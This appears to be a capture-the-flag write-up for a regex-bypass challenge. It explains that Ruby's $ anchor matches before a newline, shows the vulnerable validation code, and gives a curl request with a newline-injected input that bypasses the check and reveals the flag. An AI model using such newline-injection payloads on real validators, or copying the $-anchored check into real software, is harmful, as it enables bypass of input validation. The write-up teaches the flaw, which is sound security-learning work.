
| Anchor | Meaning |
| ------ | ------------------------------------------------ |
| `^` | Matches **beginning of text**.                            |
| `$` | **matches end of text or before newline (`\n`)**.      |
| `\A` | Matches **absolute start**. |
| `\z` | Matches **absolute end of text** (absolute end).   |

```ruby
post '/' do
  @input = params['input'].to_s
  @message = ""
  @masterkey = ""
  
  pattern = /^appsecmaster\.net$/
  
  if @input =~ pattern
    @message = "redirecting to #{@input}"
    # For challenge purposes only
    if @input != "appsecmaster.net"
      begin
        @masterkey = File.read('/tmp/masterkey.txt')
      rescue
        @masterkey = "Masterkey file not found"
      end
    end
    ###
  else
    @message = "Invalid input. Must match the pattern."
  end
  
```

| Anchor | Where does it match?                        | Example text: `"example.com\nmalicious"` |
| ------ | --------------------------------- | ------------------------------------------------------ |
| `$` | End of text **or** before **newline** | Matches `"example.com"` and ignores `\nmalicious` |
| `\z` | **absolute end** only | **Will not match** the text unless there is nothing after `"example.com"` |

### Practical example:

```ruby
# Example of regex
pattern1 = /example\.com$/
pattern2 = /example\.com\z/

input = "example.com\nmalicious"

puts input =~ pattern1 # => matches, the result will be index
puts input =~ pattern2 # => nil (no match)
```
---

## solution

> because of **`<input type="text" name="input">`** if we entered **`appsecmaster.net\nhacker.com`** it will consider it as text so will not make new line

> #### so we will send it using curl

```
curl -X POST http://3.253.72.65/ -d $'input=appsecmaster.net\nhacker.com'
```

```html
curl -X POST http://3.253.72.65/ -d $'input=appsecmaster.net\nhacker.com'
<!DOCTYPE html>
<html>
<head>
    <title>Regex Bypass Challenge</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="container">
        <h1>Welcome to AppSecMaster!</h1>
        <p>Only inputs matching the regex pattern are allowed.<br>Enter an input that will bypass the validation.</p>
        <form method="post">
            <input type="text" name="input" placeholder="e.g., appsecmaster.net" value="appsecmaster.net
hacker.com">
            <input type="submit" value="Submit Input">
        </form>

        <p class="message success">redirecting to appsecmaster.net
hacker.com</p>

        <div class="flag">
            <strong>Masterkey:</strong> <code>62108b8e6df9c25b8264f9de522027c7</code>
        </div>

    </div>
</body>
</html>

┌──(kali㉿localhost)-[~]
└─$
```

```
62108b8e6df9c25b8264f9de522027c7
```

